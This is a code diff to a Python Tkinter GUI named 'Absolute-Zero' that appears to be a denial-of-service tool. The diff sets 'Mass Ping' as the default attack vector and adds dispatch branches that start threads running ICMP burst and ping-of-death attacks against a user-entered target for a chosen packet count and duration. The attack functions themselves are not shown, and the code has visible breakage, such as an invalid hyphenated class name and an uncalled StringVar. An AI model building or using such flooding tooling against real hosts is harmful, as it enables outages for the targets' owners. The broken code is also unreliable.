@@ -22,7 +22,7 @@ class Absolute-Zero:
         self.packet_size_entry = tk.Entry(self.root)
         self.attack_duration_entry = tk.Entry(self.root)
         self.attack_vector_entry = tk.StringVar
-        self.attack_vector_entry.set("ICMP echo")
+        self.attack_vector_entry.set("Mass Ping")
 
         self.attack_vectors = [
             "Mass Ping", "ICMP echo", "ICMP burst", "PoD Attack"
@@ -85,10 +85,15 @@ class Absolute-Zero:
 
         if attack_vector == "ICMP echo":
             attack_thread = threading.Thread(target=self.icmp_echo_attack,
-                                             args=(target_text, num_packets, port, attack_duration))
+                                             args=(target_text, num_packets, attack_duration))
                                             
-        if attack_vector ==
-        
+        if attack_vector == "ICMP burst":
+            attack_thread = threading.Thread(target=self.icmp_burst_attack,
+                                             args=(target_text, num_packets, attack_duration))
+
+        if attack_vector == "PoD Attack":
+            attack_thread = threading.Thread(target=self.ping_of_death_attack,
+                                             args=(target_text, num_packets, attack_duration))
         
         
 
